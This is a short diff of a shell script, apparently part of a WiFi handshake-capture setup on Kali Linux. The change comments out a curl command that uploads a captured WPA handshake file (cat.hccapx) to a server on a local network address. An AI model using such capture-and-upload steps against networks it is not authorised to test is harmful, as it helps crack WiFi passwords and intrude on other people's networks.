@@ -16,7 +16,8 @@ main(){
 	else
 		echo "No handshakes"
 	fi
-  	curl -i -X POST -H "imei: asdfa" -H "date: 112321312" -H "Content-Type: multipart/form-data" -F "myFile=@/home/kali/cat.hccapx" http://192.168.1.34:9000/upload
+	
+  	#curl -i -X POST -H "imei: asdfa" -H "date: 112321312" -H "Content-Type: multipart/form-data" -F "myFile=@/home/kali/cat.hccapx" http://192.168.1.34:9000/upload
 }
 
 
